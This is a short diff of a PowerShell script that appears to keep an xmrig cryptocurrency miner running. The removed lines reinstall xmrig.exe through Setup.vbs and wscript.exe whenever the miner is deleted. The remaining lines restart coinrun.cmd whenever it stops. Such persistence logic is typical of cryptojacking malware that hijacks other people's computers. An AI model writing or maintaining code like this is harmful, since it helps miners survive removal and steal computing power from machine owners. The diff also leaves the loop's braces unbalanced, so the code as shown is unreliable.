@@ -27,25 +27,6 @@ if (Test-Path $xmrigPath) {
     }
 }
 
-while ($true) {
-    if (!(Test-Path $xmrigPath)) {
-        Write-Warning "xmrig.exe Del. Wait..."
-
-        if (Test-Path $setupPath) {
-            Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
-            Write-Host "Run Setup.vbs!"
-
-            while (!(Test-Path $xmrigPath)) {
-                Write-Host "Wait.. xmrig.exe"
-                Start-Sleep -Seconds 3
-            }
-
-            Write-Host "Đã phát hiện lại xmrig.exe. Khởi động coinrun.cmd"
-    
-        } else {
-            Write-Error "NO Setup.vbs: $setupPath"
-        }
-    }
     if ($global:coinRunProcess -and $global:coinRunProcess.HasExited) {
         Write-Warning "coinrun.cmd STOP. Reboot..."
         Start-CoinRun
